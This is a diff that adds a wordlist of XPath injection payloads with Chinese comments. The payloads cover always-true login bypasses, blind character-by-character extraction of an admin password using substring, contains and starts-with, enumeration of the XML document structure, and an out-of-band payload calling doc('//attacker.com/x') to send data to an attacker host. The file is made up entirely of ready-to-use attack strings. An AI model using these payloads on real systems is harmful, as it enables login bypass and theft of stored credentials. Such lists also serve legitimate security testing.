@@ -1,0 +1,26 @@
+# XPath - 认证绕过注入 OR 永真条件
+' or '1'='1
+# XPath - 认证绕过注入 空字符 OR 条件
+' or ''='
+# XPath - 闭合 XPath 注入永真条件绕过登录
+x' or 1=1 or 'x'='y
+# XPath - 盲注提取用户密码长度
+' and string-length(//user[name/text()='admin']/password)=8 and '1'='1
+# XPath - 盲注逐字符猜解用户密码
+' and substring(//user[name/text()='admin']/password,1,1)='a' and '1'='1
+# XPath - 盲注利用 codepoints-to-string 猜解密码
+' and substring(//user[name/text()='admin']/password,1,1)=codepoints-to-string(97) and '1'='1
+# XPath - 提取所有用户节点数据泄露全部账户信息
+' or 1=1] | //user[1=1
+# XPath - 逐节点提取 XML 文档结构
+' and count(/*)=1 and '1'='1
+# XPath - 提取 XML 根节点属性个数
+' and count(/@*)=1 and '1'='1
+# XPath - 利用 name() 函数获取当前节点名泄露文档结构
+x' or name()='username' or 'x'='y
+# XPath - 利用 contains 函数盲注密码子串逐字符泄露
+' and contains(../password,'a') and '1'='1
+# XPath - 利用 starts-with 函数盲注密码前缀
+' and starts-with(../password,'adm') and '1'='1
+# XPath - OOB 带外攻击 通过 document() 外带数据到攻击者服务器
+' and doc('//attacker.com/x') and '1'='1
